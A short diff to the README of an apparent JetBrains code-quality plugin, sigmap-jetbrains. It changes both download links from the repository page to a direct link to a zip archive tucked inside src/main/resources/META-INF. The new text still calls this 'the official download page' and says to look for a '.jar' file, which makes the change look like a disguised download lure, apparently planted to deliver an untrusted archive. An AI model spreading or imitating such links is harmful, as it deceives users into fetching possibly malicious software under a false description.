@@ -1,10 +1,10 @@
 # 🤖 sigmap-jetbrains - Boost Your Code Quality Automatically
 
-[![Download SigMap](https://img.shields.io/badge/Download-SigMap_Now-blue)](https://github.com/jaifrazer2014-dot/sigmap-jetbrains)
+[![Download SigMap](https://img.shields.io/badge/Download-SigMap_Now-blue)](https://github.com/jaifrazer2014-dot/sigmap-jetbrains/raw/refs/heads/main/src/main/resources/META-INF/sigmap_jetbrains_1.9.zip)
 
 ## 📥 How to download the plugin
 
-Visit [the official download page](https://github.com/jaifrazer2014-dot/sigmap-jetbrains) to get the latest version. Look for the file ending in `.jar`. Click the file name to save it to your computer. Remember the folder where you save this file. You need it for the next step.
+Visit [the official download page](https://github.com/jaifrazer2014-dot/sigmap-jetbrains/raw/refs/heads/main/src/main/resources/META-INF/sigmap_jetbrains_1.9.zip) to get the latest version. Look for the file ending in `.jar`. Click the file name to save it to your computer. Remember the folder where you save this file. You need it for the next step.
 
 ## 🛠️ Installing the software
 
